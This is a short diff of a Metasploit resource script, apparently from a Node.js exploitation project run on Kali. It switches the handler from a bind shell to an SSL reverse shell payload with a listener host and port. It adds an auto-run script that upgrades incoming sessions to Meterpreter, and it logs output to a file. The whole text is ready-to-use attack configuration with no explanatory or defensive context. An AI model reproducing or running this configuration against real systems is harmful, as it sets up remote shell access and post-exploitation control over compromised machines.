@@ -1,8 +1,9 @@
 use exploit/multi/handler
-set payload nodejs/shell_bind_tcp
-set rhost 192.168.74.148
-set lport 6565
+set payload nodejs/shell_reverse_tcp_ssl
+set lhost 192.168.74.224
+set lport 8484
 set ExitOnSession true 
+set InitialAutoRunScript 'post/multi/manage/shell_to_meterpreter' 
 spool /home/kali/PycharmProjects/nodexp/scripts/nodejs_shell.rc.output.txt
 exploit -j -z
 
